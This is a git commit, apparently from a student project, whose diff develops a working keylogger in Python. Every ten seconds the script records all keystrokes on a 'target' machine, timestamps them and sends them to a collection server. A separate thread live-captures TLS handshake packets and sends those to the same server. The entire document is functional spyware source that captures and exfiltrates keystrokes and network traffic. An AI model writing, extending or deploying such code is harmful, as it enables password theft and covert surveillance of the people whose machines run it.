8a1699670596080f46760fbf4ebe8de3894e00f2
Cope, Louis(Student) <l.cope@lancaster.ac.uk>
2026-01-25 15:50:33 +0000

    Keylog and Packetlog both functional on target and server side. Format of pcap strings are a bit messy but usable for the IP information to gather information. Recorded with timestamps to cross examine with associated keylogs

--- keylogger.py
+++ keylogger.py
@@ -1,44 +1,50 @@
 import keyboard
 import requests as rq
 from time import time
+from datetime import datetime
 import threading
 import pyshark
+import asyncio
 
 server = "http://localhost:5000"
 
 def sendKeyLog(record):
-    recordlist = ""
+    timestamp = datetime.now().strftime("%d/%m/%Y, %H:%M:%S")
+    recordlist = timestamp + " --- "
     for item in record:
         if item.event_type == "down":
             recordlist += item.name
     rs = rq.post(server + "/key", recordlist.encode('utf-8'))
+    print("Keylog sent!")
 
 def sniff():
-    capture = pyshark.LiveCapture(interface="WiFi", bpf_filter="tcp dst port 443 and ((tcp[((tcp[12] & 0xf0) >> 2)] = 0x16) or (tcp[13] & 0x02 = 2))")
-    print("capture set")
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    capture = pyshark.LiveCapture(interface="WiFi", eventloop=loop, bpf_filter="tcp dst port 443 and ((tcp[((tcp[12] & 0xf0) >> 2)] = 0x16) or (tcp[13] & 0x02 = 2))")
     capture.sniff(timeout=10)
-    print("sniffing...")
     packets = [packet for packet in capture._packets]
     capture.close()
-    print("capture closed")
-    print(f"Packet count: {len(packets)}")
-    with open("text.txt", "w") as f:
-        for packet in packets:
-            f.write(str(packet) + "\n")
+    print("Beginning packet message stream...")
+    packet_message = ""
+    for packet in packets:
+        timestamp = datetime.now().strftime("%d/%m/%Y, %H:%M:%S")
+        timestamp_header = f"\n- - - - - - - - - - - - - - - - - - - - - - - - -\n- DATETIME --- {timestamp} --- DATETIME -\n- - - - - - - - - - - - - - - - - - - - - - - - -\n\n"
+        packet_message += timestamp_header + str(packet)
+    rs = rq.post(server + "/pcap", packet_message.encode('utf-8'))
+    print("End of packet message stream!")
 
 def main():
-    count = 0
-    ts = time()
+    ts = datetime.now()
     keyboard.start_recording()
-    sniff()
+    thread = threading.Thread(target=sniff)
+    thread.start()
     while True:
-        dt = time()
-        if dt - ts > 10:
+        dt = datetime.now()
+        if (dt - ts).total_seconds() > 10:
             record = keyboard.stop_recording()
             sendKeyLog(record)
-            ts = time()
+            ts = datetime.now()
             keyboard.start_recording()
-            sniff()
             
         
 if __name__=="__main__":
